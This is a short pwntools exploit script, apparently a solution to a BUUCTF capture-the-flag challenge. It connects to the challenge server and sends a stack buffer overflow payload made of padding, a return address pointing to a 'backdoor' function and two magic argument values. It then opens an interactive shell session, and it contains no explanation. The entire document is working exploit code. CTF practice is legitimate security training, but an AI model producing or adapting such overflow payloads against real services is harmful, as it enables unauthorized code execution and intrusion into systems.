from pwn import *

context(log_level='debug',arch='amd64',os='linux')

p=remote('node5.buuoj.cn',29641)

a1=0x308CD64F
a2=0x195719D1

backdoor_addr=0x80489A0
ret_addr=0x8048196
payload=b'a'*(0x38)+p32(0)+p32(backdoor_addr)+p32(0)+p32(a1)+p32(a2)

p.sendline(payload)

p.interactive()


